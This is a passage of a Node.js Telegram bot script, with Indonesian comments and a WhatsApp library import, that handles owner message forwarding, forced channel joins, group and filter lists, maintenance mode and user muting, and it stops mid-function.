const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');
const fs = require("fs");
const pino = require("pino");
const crypto = require("crypto");
const path = require("path");
const { Client } = require("ssh2");
const os = require("os");
const sessions = new Map();
const broadcastState = {};
const scamReportSessions = {};
const readline = require("readline");
const fetch = require("node-fetch");
const cd = "./𝔙𝔢́𝔩𝔬𝔯𝔦𝔞/cooldown.json";
const archiver = require("archiver");
console.log("RESOLVE:", require.resolve("archiver"));
console.log("KEYS:", Object.keys(archiver));
console.log("RAW:", archiver);
const pendingGta = new Map();
const pendingHitam = new Map();
const pendingAnime = new Map();
const pendingDisney = new Map();
const pendingToFigure = new Map();
const animeResultCache = new Map();
const waitingForEmoji = new Map();
const ONLY_FILE = "./𝔙𝔢́𝔩𝔬𝔯𝔦𝔞/group.json";
const AUTOJOIN_DB = path.join(__dirname, "𝔙𝔢́𝔩𝔬𝔯𝔦𝔞", "autojoin.json");
const acorn = require("acorn");
const { Pakasir } = require('pakasir-sdk');
const { ESLint } = require("eslint");
//COOKIES BOTT
const cookiePath = path.join(__dirname, "cookies.txt");
let youtubeCookie = "";
try {
  if (fs.existsSync(cookiePath)) {
    youtubeCookie = fs.readFileSync(cookiePath, "utf8").trim();
    console.log("✅ cookies.txt berhasil dimuat untuk YouTube");
  } else {
    console.log("⚠️ cookies.txt tidak ditemukan, /play mungkin diblock YouTube");
  }
} catch (e) {
  console.log("⚠️ Gagal baca cookies.txt:", e.message);
}
const { createCanvas, loadImage } = require('canvas');

const filterFile = "./database/filters.json";
const USERS_FILE = "./database/users.json"
const groupsFile = "./database/groups.json";
const maintenanceFile = "./database/maintenance.json";
const groupMessageFile = './database/group_message.json';

const DEFAULT_WELCOME_PIC = "./database/welcome.jpg";
const DEFAULT_LEFT_PIC = "./database/left.jpg";

function ensureDir(filePath) {
  const dir = path.dirname(filePath);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
}

function readJsonSafe(filePath, fallback) {
  try {
    if (!fs.existsSync(filePath)) return fallback;
    const raw = fs.readFileSync(filePath, "utf8").trim();
    if (!raw) return fallback;
    return JSON.parse(raw);
  } catch (err) {
    console.error(`⚠️ Gagal baca JSON ${filePath}: ${err.message}`);
    return fallback;
  }
}

function writeJsonSafe(filePath, data) {
  try {
    ensureDir(filePath);
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
    return true;
  } catch (err) {
    console.error(`⚠️ Gagal tulis JSON ${filePath}: ${err.message}`);
    return false;
  }
}

function escapeRegex(text = "") {
  return String(text).replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}
const {
  VERSION, URL_MENU,
  TOKEN, 
  OWNER, 
  APIKEY, 
  NAMA_BOT, 
  CHANNEL_ID, 
  GROUP_ID, 
  LINK_INVITE, 
  CHANNEL_INFO, 
  SLUG_PAKASIR, 
  APIKEY_PAKASIR, 
  BUTTON_DEV,
  BUTTON_OWN, 
  BUTTON_CH,
  BUTTON_CHH, 
  BUTTON_ROOM,
  FORCE_JOIN_CHANNELS = [],
  FORCE_JOIN_GROUPS = [],
  SCAM_REPORT_CHANNELS = []
} = require("./config");

// load database
let autoJoinSettings = { enabled: false, links: [] };

if (fs.existsSync(AUTOJOIN_DB)) {
  try {
    autoJoinSettings = JSON.parse(fs.readFileSync(AUTOJOIN_DB));
  } catch {
    autoJoinSettings = { enabled: false, links: [] };
  }
}
const pakasir = new Pakasir({
  slug: `${SLUG_PAKASIR}`,
  apikey: `${APIKEY_PAKASIR}`,
});

let BOT_ID = null;
let maintenanceMode = false
let sholatSettings = {};
let jadwalCache = {};
let lastSent = {};



// save database
function saveAutoJoin() {
  fs.writeFileSync(AUTOJOIN_DB, JSON.stringify(autoJoinSettings, null, 2));
}
async function isUserJoinedAll(bot, userId, links) {
  for (let link of links) {
    try {
      let username = link.replace("https://t.me/", "").replace("@", "");

      let res = await bot.getChatMember(`@${username}`, userId);

      if (!["member", "administrator", "creator"].includes(res.status)) {
        return false;
      }

    } catch (err) {
      return false;
    }
  }
  return true;
}

function isOnlyGroupEnabled() {
  const config = JSON.parse(fs.readFileSync(ONLY_FILE));
  return config.onlyGroup;
}

function setOnlyGroup(status) {
  const config = { onlyGroup: status };
  fs.writeFileSync(ONLY_FILE, JSON.stringify(config, null, 2));
}

function shouldIgnoreMessage(msg) {
  if (!isOnlyGroupEnabled()) return false;
  return msg.chat.type === "private";
}

let premiumUsers = JSON.parse(fs.readFileSync('./𝔙𝔢́𝔩𝔬𝔯𝔦𝔞/premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./𝔙𝔢́𝔩𝔬𝔯𝔦𝔞/admin.json'));

function premium(userId) {
    const user = premiumUsers.find(u => u.id === userId);
    return user && new Date(user.expiresAt) > new Date();
}

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./𝔙𝔢́𝔩𝔬𝔯𝔦𝔞/premium.json');
ensureFileExists('./𝔙𝔢́𝔩𝔬𝔯𝔦𝔞/admin.json');


function savePremiumUsers() {
    fs.writeFileSync('./𝔙𝔢́𝔩𝔬𝔯𝔦𝔞/premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./𝔙𝔢́𝔩𝔬𝔯𝔦𝔞/admin.json', JSON.stringify(adminUsers, null, 2));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

watchFile('./𝔙𝔢́𝔩𝔬𝔯𝔦𝔞/premium.json', (data) => (premiumUsers = data));
watchFile('./𝔙𝔢́𝔩𝔬𝔯𝔦𝔞/admin.json', (data) => (adminUsers = data));

const developerId = "1769278444";
const chalk = require("chalk"); //
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const axios = require("axios");
const BOT_TOKEN = config.BOT_TOKEN;
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

async function startBot() {
  await autoStart();
  console.log("✅ [SYSTEM] Bot ready");
  console.log(
    chalk.red(`⠀
⣿⣿⣿⣿⡿⣩⣾⣿⣿⣶⣍⡻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡿⠟⣼⡿⢟⢸⣿⣿⣿⠿⢷⣝⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⡏⣾⣿⡆⣾⣿⣸⣯⣿⡾⣿⢗⠿⣷⣝⣛⢿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣮⣭⣾⣿⡏⢿⣝⣯⣽⣶⣿⣿⣿⠿⣿⡇⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⢫⣾⣿⢿⠟⣋⢿⣲⣿⡿⣟⣿⣦⣝⡻⢿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣮⢫⣾⣿⠀⠛⠁⣿⣿⣾⣿⣿⣿⣿⣯⣷⣪⣟⢿⣿
⣿⢿⢿⣿⣿⣿⢸⣿⣿⣷⣶⣾⣿⣿⣿⣿⣿⣿⣿⠻⣿⣿⣝⡜⣿
⢃⡖⣼⣿⣿⣿⣏⣿⣿⣿⣿⣿⣧⡯⣽⣛⢿⠿⠿⢿⠿⠟⡛⣣⣿
⣷⣾⣾⣿⣿⡏⣝⢨⣟⡿⣿⣿⣿⣿⣮⣿⣫⡿⠿⣭⡚⣷⣴⣿⣿
⣿⠻⢿⢰⡬⣱⣝⣮⣿⣿⣿⣾⣭⣟⣻⡿⠿⠿⠿⣛⣵⣿⣿⣿⣿
⣛⠎⢟⡴⣿⣿⣷⣿⣾⣿⣿⣿⣿⣿⣿⣿⣬⣭⣭⣝⡻⢿⣿⣿⣿
⡜⣫⣿⣷⣿⣿⣼⣿⣿⣟⡿⣿⣿⣿⣿⣿⡟⠿⣿⡿⣿⣦⢻⣿⣿
⢅⣭⣿⣿⣿⣿⣼⣿⣿⣿⣽⣿⣿⣿⣿⡿⣹⣷⣝⣃⣭⣵⣿⣿⣿
────────────────୨ৎ────────────────
➠ BOT : CONNECTED 
➠ NAME SCRIPT : VOID PRIME
➠ VERSION SCRIPT : 1.0.0
➠ DEVELOPER : @Gabrieltzyproooool
╰┈➤ Thank you for using this script and I hope it continues to develop (˶˃ ᵕ ˂˶)
────────────────୨ৎ────────────────⠀
`)
  );
}
startBot();

// ========================================
// MONITOR PRIVATE + REPLY BUTTON SYSTEM
// ========================================
const OWNER_IDS = (config.OWNER_ID || []).map(String);
const monitorMap = new Map();       // key => meta data
const ownerReplyState = new Map();  // ownerId => key (aktif hanya setelah klik)

function isOwner(id) {
  return OWNER_IDS.includes(String(id));
}

function escapeHtml(str) {
  return String(str || "")
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;");
}

function makeKey() {
  return (Date.now().toString(36) + Math.random().toString(36).slice(2, 8));
}

function summarizeMsg(msg) {
  if (msg.text) return msg.text;
  if (msg.caption) return msg.caption;
  if (msg.photo) return "📷 Photo";
  if (msg.video) return "🎥 Video";
  if (msg.document) return "📄 Document";
  if (msg.voice) return "🎤 Voice";
  if (msg.audio) return "🎧 Audio";
  return "📩 Message";
}

// =============================
// PRIVATE MESSAGE MONITOR
// =============================
bot.on("message", async (msg) => {
  try {
    if (!msg?.chat) return;

    // OWNER MESSAGE
    if (isOwner(msg.from?.id)) {

      // Jangan teruskan command
      if (msg.text && msg.text.startsWith("/")) return;

      const key = ownerReplyState.get(String(msg.from.id));
      if (!key) return; // tidak dalam mode balas

      const meta = monitorMap.get(key);
      if (!meta) return;

      ownerReplyState.delete(String(msg.from.id)); // matikan mode

      const targetChatId = meta.chatId;
      const replyTo = meta.replyToMessageId;

      // Kirim sesuai tipe
      if (msg.text) {
        await bot.sendMessage(targetChatId, msg.text, { reply_to_message_id: replyTo });
      } else if (msg.photo) {
        const fid = msg.photo[msg.photo.length - 1].file_id;
        await bot.sendPhoto(targetChatId, fid, { caption: msg.caption || "", reply_to_message_id: replyTo });
      } else if (msg.video) {
        await bot.sendVideo(targetChatId, msg.video.file_id, { caption: msg.caption || "", reply_to_message_id: replyTo });
      } else if (msg.document) {
        await bot.sendDocument(targetChatId, msg.document.file_id, { caption: msg.caption || "", reply_to_message_id: replyTo });
      } else if (msg.voice) {
        await bot.sendVoice(targetChatId, msg.voice.file_id, { reply_to_message_id: replyTo });
      } else if (msg.audio) {
        await bot.sendAudio(targetChatId, msg.audio.file_id, { reply_to_message_id: replyTo });
      } else if (msg.sticker) {
        await bot.sendSticker(targetChatId, msg.sticker.file_id, { reply_to_message_id: replyTo });
      }

      const confirm =
`<blockquote><tg-emoji emoji-id="5398106397319657446">☑️</tg-emoji> <b>Pesan berhasil diteruskan ke target</b></blockquote>`;

      await bot.sendMessage(msg.chat.id, confirm, { parse_mode: "HTML" });

      return;
    }

    // =============================
    // PRIVATE USER (FORWARD TO OWNER)
    // =============================
    if (msg.chat.type === "private") {

      const key = makeKey();
      monitorMap.set(key, {
        chatId: msg.chat.id,
        replyToMessageId: msg.message_id,
      });

      const preview = summarizeMsg(msg);

      const html =
`<blockquote><b><tg-emoji emoji-id="5397884480654442004">🔔</tg-emoji> 𝙿𝚁𝙸𝚅𝙰𝚃 𝙼𝙴𝚂𝚂𝙰𝙶𝙴</b></blockquote>
<blockquote><b><tg-emoji emoji-id="5413679274425087559">🐈‍⬛</tg-emoji> 𝙽𝚊𝚖𝚎:</b> ${escapeHtml(msg.from.first_name || "")}</blockquote>
<blockquote><b><tg-emoji emoji-id="5400371339733270653">🔗</tg-emoji> 𝚄𝚜𝚎𝚛𝚗𝚊𝚖𝚎:</b> ${escapeHtml(msg.from.username ? "@" + msg.from.username : "𝙽𝚐𝚐𝚊𝚍𝚊 𝙹𝚒𝚛")}</blockquote>
<blockquote><b><tg-emoji emoji-id="5400303217256987122">✈️</tg-emoji> 𝚄𝚜𝚎𝚛𝙸𝚍:</b> <code>${escapeHtml(String(msg.from.id))}</code></blockquote>
<blockquote><b><tg-emoji emoji-id="5400289821253990206">📝</tg-emoji> 𝙿𝚛𝚎𝚟𝚒𝚎𝚠:</b> ${escapeHtml(preview)}</blockquote>`;

      const markup = {
        inline_keyboard: [
          [{ text: "Balas", callback_data: `reply:${key}`,icon_custom_emoji_id: "4972319080649327590",style: "danger" }]
        ]
      };

      for (const ownerId of OWNER_IDS) {
        await bot.sendMessage(ownerId, html, {
          parse_mode: "HTML",
          reply_markup: markup
        });

        try {
          await bot.forwardMessage(ownerId, msg.chat.id, msg.message_id);
        } catch {}
      }
    }

  } catch {}
});
// ===============================
// DETEKSI BOT DITAMBAHKAN KE GROUP
// ===============================
let _botMeCache = null;
async function getBotMeCached() {
  if (_botMeCache) return _botMeCache;
  _botMeCache = await bot.getMe().catch(() => null);
  return _botMeCache;
}

function userInfo(from) {
  const full = `${(from?.first_name || "").trim()} ${(from?.last_name || "").trim()}`.trim() || "Unknown";
  const username = from?.username ? `@${from.username}` : "(no username)";
  const id = from?.id != null ? String(from.id) : "-";
  return { full, username, id };
}

function chatInfo(chat) {
  const title = chat?.title || "Unknown";
  const id = chat?.id != null ? String(chat.id) : "-";
  const type = chat?.type || "unknown";
  return { title, id, type };
}

async function notifyOwnersHTML(html) {
  for (const ownerId of OWNER_IDS) {
    try {
      await bot.sendMessage(ownerId, html, {
        parse_mode: "HTML",
        disable_web_page_preview: true,
      });
    } catch {}
  }
}

// 1) Deteksi paling umum: service message new_chat_members (ada yang add bot)
bot.on("message", async (msg) => {
  try {
    if (!msg?.chat) return;

    // hanya group/supergroup
    if (msg.chat.type !== "group" && msg.chat.type !== "supergroup") return;

    // cek apakah ada new members
    const newMembers = msg.new_chat_members || [];
    if (!newMembers.length) return;

    const me = await getBotMeCached();
    const botId = me?.id;
    if (!botId) return;

    // apakah bot termasuk yang ditambahkan?
    const botAdded = newMembers.some((m) => m?.id === botId);
    if (!botAdded) return;

    const u = userInfo(msg.from); // orang yang menambahkan
    const c = chatInfo(msg.chat);

    const html =
`<blockquote>⚠️ <b>𝙱𝙾𝚃 𝙳𝙸 𝚃𝙰𝙼𝙱𝙰𝙷𝙺𝙰𝙽 𝙺𝙴 𝙶𝚁𝙾𝚄𝙿!</b></blockquote>
<blockquote><b>👤 𝙳𝚒𝚝𝚊𝚖𝚋𝚊𝚑𝚔𝚊𝚗 𝚘𝚕𝚎𝚑:</b> ${escapeHtml(u.full)}</blockquote>
<blockquote><b>🔗 𝚄𝚜𝚎𝚛𝚗𝚊𝚖𝚎:</b> ${escapeHtml(u.username)}</blockquote>
<blockquote><b>🆔 𝚄𝚜𝚎𝚛𝙸𝚍:</b> <code>${escapeHtml(u.id)}</code></blockquote>
<blockquote><b>🏷️ 𝙶𝚛𝚘𝚞𝚙𝙽𝚊𝚖𝚎:</b> ${escapeHtml(c.title)}</blockquote>
<blockquote><b>🧾 𝙲𝚑𝚊𝚝𝙸𝚍:</b> <code>${escapeHtml(c.id)}</code></blockquote>
<blockquote><b>📌 𝚃𝚢𝚙𝚎:</b> <code>${escapeHtml(c.type)}</code></blockquote>`;

    await notifyOwnersHTML(html);

  } catch {}
});


// 2) Deteksi lebih akurat: my_chat_member (status bot berubah jadi member/admin)
// Ini kepake kalau bot diangkat jadi admin juga, atau kasus tertentu yang gak muncul new_chat_members
bot.on("my_chat_member", async (upd) => {
  try {
    const chat = upd?.chat;
    if (!chat) return;

    // hanya group/supergroup/channel
    if (!["group", "supergroup", "channel"].includes(chat.type)) return;

    const oldStatus = upd?.old_chat_member?.status;
    const newStatus = upd?.new_chat_member?.status;

    if (!newStatus || newStatus === oldStatus) return;

    // status masuk: member/admin
    if (newStatus === "member" || newStatus === "administrator") {
      const u = userInfo(upd.from);
      const c = chatInfo(chat);

      const html =
`<blockquote><b><tg-emoji emoji-id="5420323339723881652">⚠️</tg-emoji>𝙱𝙾𝚃 𝚁𝙾𝙻𝙴 𝚄𝙿𝙳𝙰𝚃𝙴</b></blockquote>
<blockquote><b><tg-emoji emoji-id="5400289821253990206">📝</tg-emoji> 𝙾𝚕𝚎𝚑:</b> ${escapeHtml(u.full)}</blockquote>
<blockquote><b><tg-emoji emoji-id="5226893221191237996">👾</tg-emoji> 𝚄𝚜𝚎𝚛𝚗𝚊𝚖𝚎:</b> ${escapeHtml(u.username)}</blockquote>
<blockquote><b>🆔 𝚄𝚜𝚎𝚛𝙸𝚍:</b> <code>${escapeHtml(u.id)}</code></blockquote>
<blockquote><b>📌 𝙻𝚘𝚌𝚊𝚝𝚒𝚘𝚗:</b> ${escapeHtml(c.title)}</blockquote>
<blockquote><b>🧾 𝙲𝚑𝚊𝚝𝙸𝚍:</b> <code>${escapeHtml(c.id)}</code></blockquote>
<blockquote><b>🔄 𝚂𝚝𝚊𝚝𝚞𝚜:</b> <code>${escapeHtml(oldStatus || "-")} → ${escapeHtml(newStatus)}</code></blockquote>`;

      await notifyOwnersHTML(html);
    }
  } catch {}
});
bot.on("callback_query", async (callbackQuery) => {
  // Ambil data penting di awal
  const callbackId = callbackQuery.id;
  const data = callbackQuery?.data || "";
  const ownerId = String(callbackQuery.from.id);

  try {
    // [FIX image.png] Langsung jawab secepat mungkin agar Telegram tidak timeout
    await bot.answerCallbackQuery(callbackId).catch(() => {});

    // =============================
    // REPLY SYSTEM ROUTER
    // =============================
    if (data.startsWith("reply:")) {
      if (!isOwner(ownerId)) {
        await bot.answerCallbackQuery(callbackId, {
          text: "Bukan owner.",
          show_alert: true
        }).catch(() => {});
        return;
      }

      const key = data.split("reply:")[1];
      ownerReplyState.set(ownerId, key);

      const html = 
`<blockquote>✉️ <b>𝙼𝙾𝙳𝙴 𝙱𝙰𝙻𝙰𝚂 𝙰𝙺𝚃𝙸𝙵!</b></blockquote>
<blockquote>Ketik pesan sekarang untuk diteruskan ke user tersebut.</blockquote>`;

      await bot.sendMessage(ownerId, html, { parse_mode: "HTML" });
      return;
    }

  } catch (err) {
    console.log("Callback error:", err);
  }
}); // [FIX image_2.png] Pastikan penutup kurung ini ada agar tidak SyntaxError

let sock;

let deviceList = [];
const SESSION_PATH = "./session";

// cek koneksi
let pairingTargetChatId = null;

const isWhatsAppConnected = () => {
    return waConnectionState === "open";
};
// --- Fungsi Device ---
const loadDeviceList = () => {
    try {
        deviceList = JSON.parse(fs.readFileSync('./ListDevice.json'));
    } catch {
        deviceList = [];
    }
};

const saveDeviceList = () => {
    fs.writeFileSync('./ListDevice.json', JSON.stringify(deviceList, null, 2));
};

const setSingleDevice = (userId, token) => {
    deviceList = [{ number: 1, userId, token }];
    saveDeviceList();
};

const clearSession = () => {
    try {
        if (fs.existsSync(SESSION_PATH)) {
            fs.rmSync(SESSION_PATH, { recursive: true, force: true });
            console.log("🗑️ Session berhasil dihapus");
        }
    } catch (err) {
        console.log("Gagal hapus session:", err);
    }
};

const addDeviceToList = (userId, token) => {
    const deviceNumber = deviceList.length + 1;
    deviceList.push({ number: deviceNumber, userId, token });
    saveDeviceList();
    console.log(chalk.green.bold(`New Sender Added: ${deviceNumber} | ${userId}`));
};

//FUNCTION GROUP MENU
function loadUsers() {
  return readJsonSafe(USERS_FILE, {})
}

function saveUsers(data) {
  writeJsonSafe(USERS_FILE, data)
}

function migrateUsersDatabase() {
  const users = loadUsers();
  let updated = false;

  for (const id in users) {
    if (users[id].wins === undefined) {
      users[id].wins = 0;
      updated = true;
    }

    if (users[id].losses === undefined) {
      users[id].losses = 0;
      updated = true;
    }

    if (users[id].draws === undefined) {
      users[id].draws = 0;
      updated = true;
    }
    
    if (users[id].totalDonasi === undefined) {
      users[id].totalDonasi = 0;
      updated = true;
    }
    
    if (users[id].saldo === undefined) {
      users[id].saldo = 0;
      updated = true;
    }
  }

  if (updated) {
    saveUsers(users);
    console.log("Users database migrated successfully.");
  }
}

function buildLink(id, invite) {
  if (invite) return invite;
  if (!id) return null;
  if (id.startsWith("@")) return `https://t.me/${id.slice(1)}`;
  return null;
}

function normalizeJoinTargets() {
  const channels = Array.isArray(FORCE_JOIN_CHANNELS) && FORCE_JOIN_CHANNELS.length
    ? FORCE_JOIN_CHANNELS
    : [buildLink(CHANNEL_ID)].filter(Boolean);
  const groups = Array.isArray(FORCE_JOIN_GROUPS) && FORCE_JOIN_GROUPS.length
    ? FORCE_JOIN_GROUPS
    : [buildLink(GROUP_ID, LINK_INVITE)].filter(Boolean);

  const parseTarget = (url, type) => {
    if (!url) return null;
    const clean = String(url).trim();
    const match = clean.match(/t\.me\/([A-Za-z0-9_]+)/i);
    const username = match ? match[1] : clean.replace(/^@/, '');
    if (!username) return null;
    return {
      type,
      url: clean.startsWith('http') ? clean : `https://t.me/${username}`,
      username: `@${username}`,
      text: type === 'channel' ? `Join Channel ${type === 'channel' ? '' : ''}` : `Join Group`
    };
  };

  return {
    channels: channels.map(url => parseTarget(url, 'channel')).filter(Boolean),
    groups: groups.map(url => parseTarget(url, 'group')).filter(Boolean)
  };
}

function buildForceJoinKeyboard(userId) {
  const { channels, groups } = normalizeJoinTargets();
  const rows = [];
  channels.forEach((item, idx) => rows.push([{ text: `Join Channel ${idx + 1}`, url: item.url, style: "primary", icon_custom_emoji_id: "6098421155897545579" }]));
  groups.forEach((item, idx) => rows.push([{ text: `Join Group ${idx + 1}`, url: item.url, style: "primary", icon_custom_emoji_id: "5258236805890710909" }]));
  rows.push([{ text: "Sudah Join", callback_data: `cekjoin_${userId}`, style: "success", icon_custom_emoji_id: "5936067938955039275" }]);
  return { inline_keyboard: rows };
}

async function isUserJoinedTargets(userId) {
  const { channels, groups } = normalizeJoinTargets();
  const validStatus = ["member", "administrator", "creator"];
  for (const item of [...channels, ...groups]) {
    try {
      const member = await bot.getChatMember(item.username, userId);
      if (!validStatus.includes(member.status)) return false;
    } catch (err) {
      return false;
    }
  }
  return true;
}

async function isJoinedFeature(userId) {
  return await isUserJoinedTargets(userId);
}

async function checkJoinFeature(msg) {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (OWNER.includes(String(userId))) return true;

  const joined = await isJoinedFeature(userId);
  if (joined) return true;

  const sentMsg = await bot.sendMessage(chatId,
    `<blockquote><tg-emoji emoji-id="5787672755839176187">❌</tg-emoji> Kamu harus join semua channel & group dulu!</blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: buildForceJoinKeyboard(userId)
    }
  );

  pendingJoinMessages[`${chatId}_${sentMsg.message_id}`] = userId;
  return false;
}

async function requireJoin(msg) {
  return await checkJoinFeature(msg);
}

//====================== FUNCTION GROUP ===================

async function isJoined(userId) {
  return await isUserJoinedTargets(userId);
}

function loadGroups() {
  return readJsonSafe(groupsFile, []);
}

function saveGroups(data) {
  writeJsonSafe(groupsFile, data);
}

function initializeGroupsFromJson() {
  try {
    const groups = loadGroups();
    console.log(`✅ Grup berhasil dimuat dari file. Total: ${groups.length}`);
    return groups;
  } catch (err) {
    console.error("❌ Gagal memuat grup dari file:", err);
    return [];
  }
}

function getGroupMessages() {
  return readJsonSafe(groupMessageFile, {});
}

function saveGroupMessages(data) {
  writeJsonSafe(groupMessageFile, data);
}

function loadFilters() {
  return readJsonSafe(filterFile, {});
}

function saveFilters(data) {
  writeJsonSafe(filterFile, data);
}

function getSettings() {
  return readJsonSafe(groupMessageFile, {});
}

function saveSettings(data) {
  writeJsonSafe(groupMessageFile, data);
}

function sendGroupList(chatId, page) {
  const groups = loadGroups();
  const perPage = 15;

  const totalPages = Math.ceil(groups.length / perPage);

  if (page < 1) page = 1;
  if (page > totalPages) page = totalPages;

  const start = (page - 1) * perPage;
  const end = start + perPage;

  const slice = groups.slice(start, end);

  let text = `<blockquote><tg-emoji emoji-id="5931718859366075705">📂</tg-emoji> Daftar Group</blockquote>\n`;
  text += `<blockquote><tg-emoji emoji-id="5033080906403808074">📝</tg-emoji> Page ${page}/${totalPages})</blockquote>\n\n`;
  if (slice.length === 0) {
    text += "_Tidak ada data group._";
  } else {
    slice.forEach(g => {
      text += `• ${g.title}\n⤷ ${g.id}\n`;
    });
  }

  text += `\n<blockquote><tg-emoji emoji-id="5319169695897632605">💃</tg-emoji> Total Group: ${groups.length}</blockquote>`;

  const keyboard = {
    inline_keyboard: []
  };

  let row = [];

  if (page > 1) {
    row.push({ text: "Back", callback_data: `listgb_${page - 1}`, style : "danger", icon_custom_emoji_id: "5258236805890710909" });
  }

  if (page < totalPages) {
    row.push({ text: "Next", callback_data: `listgb_${page + 1}`, style : "danger", icon_custom_emoji_id: "5260450573768990626" });
  }

  if (row.length > 0) keyboard.inline_keyboard.push(row);

  bot.sendMessage(chatId, text, {
    parse_mode: "HTML",
    reply_markup: keyboard
  });
}

function sendFilterPage(chatId, page) {
  const filters = loadFilters();
  if (!filters[chatId] || Object.keys(filters[chatId]).length === 0) {
    return bot.sendMessage(chatId, `<blockquote><tg-emoji emoji-id="5787672755839176187">❌</tg-emoji> Tidak ada filter yang tersimpan.</blockquote>`, {
      parse_mode: "HTML"
    });
  }

  const allFilters = Object.keys(filters[chatId]);
  const perPage = 5;
  const totalPage = Math.ceil(allFilters.length / perPage);

  if (page < 1) page = 1;
  if (page > totalPage) page = totalPage;

  const start = (page - 1) * perPage;
  const items = allFilters.slice(start, start + perPage);

  let text = `📜 DAFTAR FILTER (Page ${page}/${totalPage})\n\n`;

  items.forEach((keyword, index) => {
    const data = filters[chatId][keyword];
    text += `${start + index + 1}. ${keyword}*\n`;
    text += `📝 Balasan: _${data.text || "-"}_\n`;
    text += `📎 Media: ${data.file ? data.file.type : "Tidak ada"}\n`;
    text += `\n`;
  });

  const buttons = [];

  items.forEach((keyword) => {
    buttons.push([
      {
        text: `❌ Hapus "${keyword}"`,
        callback_data: `delfilter_${keyword}_${page}`,
        style: "danger"
      }
    ]);
  });

  const navButtons = [];
  if (page > 1) navButtons.push({ text: "Prev", callback_data: `filterpage_${page - 1}`, style : "danger", icon_custom_emoji_id: "5258236805890710909" });
  if (page < totalPage) navButtons.push({ text: "Next", callback_data: `filterpage_${page + 1}`, style : "danger", icon_custom_emoji_id: "5260450573768990626" });

  if (navButtons.length > 0) buttons.push(navButtons);

  bot.sendMessage(chatId, text, {
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: buttons }
  });
}

if (!fs.existsSync(maintenanceFile)) {
  writeJsonSafe(maintenanceFile, { maintenance: false })
}

function getMaintenance() {
  const data = readJsonSafe(maintenanceFile, { maintenance: false })
  return Boolean(data.maintenance)
}

function setMaintenance(status) {
  writeJsonSafe(maintenanceFile, { maintenance: Boolean(status) })
}

function isMaintenance(msg) {
  const userId = String(msg.from.id)

  if (getMaintenance() && !OWNER.includes(userId)) {
    bot.sendMessage(msg.chat.id,
      `<blockquote><tg-emoji emoji-id="5462921117423384478">🛠</tg-emoji> Bot maintenance.\nSedang Dalam Update/Perbaikan\nTunggu sampai selesai ya.</blockquote>`,
      { parse_mode: "HTML" }
    )
    return true
  }
  return false
}

function onlyGroup(msg, bot) {
  const chatId = msg.chat.id;

  if (msg.chat.type === "private") {
    bot.sendMessage(chatId,
`<blockquote><tg-emoji emoji-id="5805345674383855340">🚫</tg-emoji> Perintah ini hanya bisa digunakan di grup.</blockquote>`,
    { parse_mode: "HTML" }
    );
    return false;
  }

  return true;
}

async function muteUser(bot, chatId, userId, mentionUser, reason) {
  try {
    const member = await bot.getChatMember(chatId, userId);
    
    if (member.status === "restricted" && !member.can_send_messages) {
      console.log(`[MUTE SKIP] User ${userId} sudah di-mute`);
      return false;
    }
    
    if (["administrator", "creator"].includes(member.status)) {
      console.log(`[MUTE SKIP] User ${userId} adalah admin/creator`);
      return false;
    }

    const until = Math.floor(Date.now()/1000) + (5 * 60);

    await bot.restrictChatMember(chatId, userId, {
      permissions: {
        can_send_messages: false,
        can_send_audios: false,
        can_send_documents: false,
        can_send_photos: false,
        can_send_videos: false,
        can_send_video_notes: false,
        can_send_voice_notes: false,
        can_send_polls: false,
        can_send_other_messages: false,
        can_add_web_page_previews: false
      },
      until_date: until
    });

    await bot.sendMessage(chatId,
